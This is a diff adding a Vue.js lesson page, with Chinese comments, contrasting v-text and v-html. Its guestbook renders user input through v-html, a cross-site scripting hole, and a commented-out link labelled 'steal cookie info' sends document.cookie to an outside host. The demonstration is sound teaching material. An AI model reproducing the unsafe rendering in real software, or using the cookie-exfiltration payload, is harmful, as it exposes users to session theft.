@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>vue的其他指令</title>
+    <script src="../js/vue.js"></script>
+</head>
+<body>
+<div id="app">
+    <h1>{{msg}}</h1>
+<!--
+    v-test指令：
+        可以将指令的内容拿出来填充到标签体当中，和JS的innerTest一样
+        这种填充是以覆盖的形式进行的。先清空标签体当中原有的内容。
+        即使内容是一段html代码，这种方式也不会将html代码解析并执行，只会当做普通的字符串文本显示处理
+-->
+    <h1 v-text="msg"></h1>
+    <h1 v-text="name"></h1>
+    <h1 v-text="sl"></h1>
+
+    <!--
+    v-html指令:
+        和v-test一样，也是填充标签体内容，也是采用覆盖的形式进行
+        只不过v-html会将内容当作一段Html代码解析并执行
+        和js中的innerHtml功能一样
+-->
+
+    <h1 v-html="sl"></h1>
+
+    <ul>
+        <li v-for="m of messageList" :key="index" v-html="m"></li>
+    </ul>
+    <textarea cols="50" rows="10" v-model.lazy="message"></textarea>
+    <br><br>
+    <button @click="save">保存留言</button>
+
+<!--    <a href="javascript:location.href='http://www.baidu.com?'+document.cookie">盗取cookie信息</a>-->
+
+</div>
+
+
+
+
+<script>
+    const vm = new Vue({
+        el : '#app',
+        data:{
+            msg:'Vue的其它指令',
+            name:'jack',
+            sl:'<h1>Hello Vue</h1>',
+            message:'',
+            messageList:[]
+        },
+        methods:{
+            save(){
+                this.messageList.push(this.message)
+            }
+        }
+    })
+</script>
+
+</body>
+</html>
